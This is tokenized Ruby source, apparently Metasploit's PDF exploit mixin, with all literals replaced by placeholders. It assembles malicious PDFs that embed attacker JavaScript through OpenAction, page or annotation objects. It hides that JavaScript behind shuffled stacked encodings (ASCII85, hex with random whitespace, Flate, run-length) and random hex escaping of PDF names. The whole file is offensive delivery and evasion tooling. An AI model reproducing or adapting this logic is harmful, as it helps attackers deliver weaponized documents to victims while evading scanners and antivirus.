module Msf module Exploit::PDF def initialize ( info = { } ) super register_options ( [ OptBool . new ( <str> , [ true , <str> , true ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) , ] , Msf :: Exploit :: PDF ) @xref = { } @pdf = <str> end def ascii_hex_whitespace_encode ( str ) return str if not datastore [ <str> ] result = <str> whitespace = <str> str . each_byte do | b | result << whitespace << <str> % b whitespace = <str> * ( rand ( <int> ) + <int> ) end result << <str> end def run_length_encode ( stream ) eod = <int> result = <str> i = <int> while i < stream . size length = <int> while i + <int> < stream . size and length < eod and stream [ i ] == stream [ i + <int> ] length = length + <int> i = i + <int> end if length > <int> result << ( <int> - length ) . chr << stream [ i , <int> ] else j = i while j + <int> < stream . size and ( j - i + <int> ) < eod and stream [ j ] != stream [ j + <int> ] j = j + <int> end length = j - i result << length . chr << stream [ i , length + <int> ] i = j end i = i + <int> end result << eod . chr end def random_non_ascii_string ( count ) result = <str> count . times do result << ( rand ( <int> ) + <int> ) . chr end result end def ascii85_encode ( stream ) eod = <str> i = <int> code = <str> input = stream . dup while i < input . size do if input . length - i < <int> addend = <int> - ( input . length - i ) input << <str> * addend else addend = <int> end inblock = ( input [ i ] . ord * <int> ** <int> + input [ i + <int> ] . ord * <int> ** <int> + input [ i + <int> ] . ord * <int> + input [ i + <int> ] . ord ) outblock = <str> <int> . times do | p | c = inblock / <int> ** ( <int> - p ) outblock << ( <str> [ <int> ] . ord + c ) . chr inblock -= c * <int> ** ( <int> - p ) end outblock = <str> if outblock == <str> and addend == <int> if addend != <int> outblock = outblock [ <int> , ( <int> - addend ) + <int> ] end code << outblock i = i + <int> end code << eod end def nobfu ( str ) return str if not datastore [ <str> ] result = <str> str . scan ( <str> ) do | c | if rand ( <int> ) == <int> and c . upcase > = <str> and c . upcase < = <str> result << <str> % c . unpack ( <str> ) [ <int> ] else result << c end end result end def header ( version = <str> ) hdr = <str> version <str> << eol hdr << <str> << random_non_ascii_string ( <int> ) << eol hdr end def add_object ( num , data ) @xref [ num ] = @pdf . length @pdf << io_def ( num ) @pdf << data @pdf << endobj end def finish_pdf @xref_offset = @pdf . length @pdf << xref_table @pdf << trailer ( <int> ) @pdf << startxref @pdf end def xref_table id = @xref . keys . max + <int> ret = <str> << eol ret << <str> % id << eol ret << <str> << eol ret << ( <int> .. @xref . keys . max ) . map do | index | if @xref . has_key? ( index ) offset = @xref [ index ] <str> % offset << eol else <str> << eol end end . join ret end def trailer ( root_obj ) ret = <str> << nobfu ( <str> % ( @xref . length + <int> ) ) << io_ref ( root_obj ) << <str> << eol ret end def startxref ret = <str> << eol ret << @xref_offset . to_s << eol ret << <str> << eol ret end def eol @eol || <str> end def eol = ( new_eol ) @eol = new_eol end def endobj <str> << eol end def io_def ( id ) <str> % id end def io_ref ( id ) <str> % id end def create_pdf ( js ) strFilter = <str> arrResults = [ ] numIterations = <int> arrEncodings = [ <str> , <str> , <str> , <str> ] arrEncodings = arrEncodings . shuffle if datastore [ <str> ] < arrEncodings . length numIterations = datastore [ <str> ] else numIterations = arrEncodings . length end for i in ( <int> .. numIterations - <int> ) if i == <int> arrResults = select_encoder ( js , arrEncodings [ i ] , strFilter ) next end arrResults = select_encoder ( arrResults [ <int> ] , arrEncodings [ i ] , arrResults [ <int> ] ) end case datastore [ <str> ] when <str> pdf_with_page_exploit ( arrResults [ <int> ] , arrResults [ <int> ] ) when <str> pdf_with_openaction_js ( arrResults [ <int> ] , arrResults [ <int> ] ) when <str> pdf_with_annot_js ( arrResults [ <int> ] , arrResults [ <int> ] ) end end def select_encoder ( js , strEncode , strFilter ) case strEncode when <str> js = ascii85_encode ( js ) strFilter = <str> << <str> strFilter <str> when <str> js = ascii_hex_whitespace_encode ( js ) strFilter = <str> << <str> strFilter <str> when <str> js = Zlib :: Deflate . deflate ( js ) strFilter = <str> << <str> strFilter <str> when <str> js = run_length_encode ( js ) strFilter = <str> << <str> strFilter <str> end return js , strFilter end def pdf_with_page_exploit ( js , strFilter ) @xref = { } @pdf = <str> @pdf << header add_object ( <int> , nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> ) << io_ref ( <int> ) << <str> ) add_object ( <int> , nobfu ( <str> ) ) add_object ( <int> , nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> ) ) add_object ( <int> , nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> % [ rand ( <int> ) , rand ( <int> ) , rand ( <int> ) , rand ( <int> ) ] ) << nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> ) ) compressed = js stream = <str> % compressed . length << strFilter << <str> << eol stream << <str> << eol stream << compressed << eol stream << <str> << eol add_object ( <int> , stream ) finish_pdf end def pdf_with_openaction_js ( js , strFilter ) @xref = { } @pdf = <str> @pdf << header add_object ( <int> , nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> ) << io_ref ( <int> ) << <str> ) add_object ( <int> , nobfu ( <str> ) ) add_object ( <int> , nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> ) ) add_object ( <int> , nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> % [ rand ( <int> ) , rand ( <int> ) , rand ( <int> ) , rand ( <int> ) ] ) << nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> ) ) compressed = js stream = <str> % compressed . length << strFilter << <str> << eol stream << <str> << eol stream << compressed << eol stream << <str> << eol add_object ( <int> , stream ) finish_pdf end def pdf_with_annot_js ( js , strFilter ) @xref = { } @pdf = <str> @pdf << header add_object ( <int> , nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> ) << io_ref ( <int> ) << <str> ) add_object ( <int> , nobfu ( <str> ) ) add_object ( <int> , nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> ) ) add_object ( <int> , nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> % [ rand ( <int> ) , rand ( <int> ) , rand ( <int> ) , rand ( <int> ) ] ) << nobfu ( <str> ) << io_ref ( <int> ) << nobfu ( <str> ) ) add_object ( <int> , nobfu ( <str> % [ rand ( <int> ) , rand ( <int> ) , rand ( <int> ) , rand ( <int> ) ] ) << io_ref ( <int> ) << nobfu ( <str> ) ) compressed = js stream = <str> % compressed . length << strFilter << <str> << eol stream << <str> << eol stream << compressed << eol stream << <str> << eol add_object ( <int> , stream ) finish_pdf end end end 
